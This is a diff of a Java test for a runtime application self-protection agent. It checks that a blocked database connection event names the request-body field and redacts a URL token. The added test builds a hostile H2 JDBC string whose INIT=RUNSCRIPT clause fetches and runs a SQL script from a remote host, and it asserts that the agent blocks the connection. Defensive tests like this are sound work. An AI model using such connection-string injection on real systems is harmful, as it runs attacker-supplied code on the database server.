@@ -60,10 +60,9 @@ final class OhMyRaspHooksUrlCredentialsTest {
   }
 
   /**
-   * Both rewrites of an event's details, in their order: the body's value is named first (fix/body), then the URL's
-   * own credentials are removed around that name (fix/scope). The application builds a URL with its credentials to
-   * a host the request body chose; the event and the block both carry the field's name, and neither the host nor a
-   * credential.
+   * On a request with a body a URL the application built with its credentials is an operand the event withholds
+   * whole. The host came from the request body: the event and the block both name that field and show its value,
+   * and neither the rest of the URL nor a credential.
    */
   @Test
   void aUrlWithCredentialsOnARequestWithABodyIsWithheldWholeAndTheMatchedFieldIsNamed(@TempDir Path dir)
@@ -105,9 +104,38 @@ final class OhMyRaspHooksUrlCredentialsTest {
   }
 
   /**
-   * A body value equal to a credential's name ("password") inside a URL that carries that credential: the redaction
-   * reads the URL as the application built it, before the body scrubber renames the value, so neither the event nor
-   * the block carries the password. Scrubbing first left {@code ?[body:field]=<password>}.
+   * A body field that is itself a URL with a credential, used whole in the operand: the field is matched against
+   * the operand as the application built it, and the value shown has its credential removed, in the event and in
+   * the block. Removing the credentials from the operand first left nothing for the field to match, and the event
+   * named no input.
+   */
+  @Test
+  void aBodyFieldThatIsAUrlWithACredentialIsNamedAndShownWithoutIt(@TempDir Path dir) throws Exception {
+    Path log = dir.resolve("events.jsonl");
+    OhMyRaspHooks.reportTo(logger(log));
+    System.setProperty("ohmyrasp.block", "true");
+    String script = "http://10.20.30.40/init.sql?token=" + SENTINEL;
+    byte[] body = ("{\"script\":\"" + script + "\"}").getBytes(StandardCharsets.UTF_8);
+    OhMyRaspHooks.enterHttpRequest(new OhMyRaspHooksRequestBodyTest.BodyRequest("/app/ping", "application/json",
+        body.length), new OhMyRaspHooksPolicyTest.FakeResponse());
+    try {
+      OhMyRaspHooks.exitBodyRead(body.length, OhMyRaspHooks.enterBodyRead(new Object()), body, 0);
+      OhMyRaspBlockException blocked = assertThrows(OhMyRaspBlockException.class,
+          () -> OhMyRaspHooks.beforeJdbcConnect("jdbc:h2:mem:reports;INIT=RUNSCRIPT FROM '" + script + "'"));
+      assertEquals("script", blocked.detection().details().get("input_field"));
+      assertEquals("http://10.20.30.40/init.sql?token=[redacted]", blocked.detection().details().get("input_value"));
+    } finally {
+      OhMyRaspHooks.exitHttpRequest();
+    }
+    String spooled = Files.readString(log);
+    assertTrue(spooled.contains("\"input_value\":\"http://10.20.30.40/init.sql?token=[redacted]\""), spooled);
+    assertFalse(spooled.contains(SENTINEL), spooled);
+  }
+
+  /**
+   * A body value equal to a credential's name ("password") inside a URL that carries that credential: on a request
+   * with a body the details are replaced by the allow-list, so neither the event nor the block carries the
+   * password.
    */
   @Test
   void aBodyValueThatIsACredentialsNameDoesNotHideTheCredential(@TempDir Path dir) throws Exception {
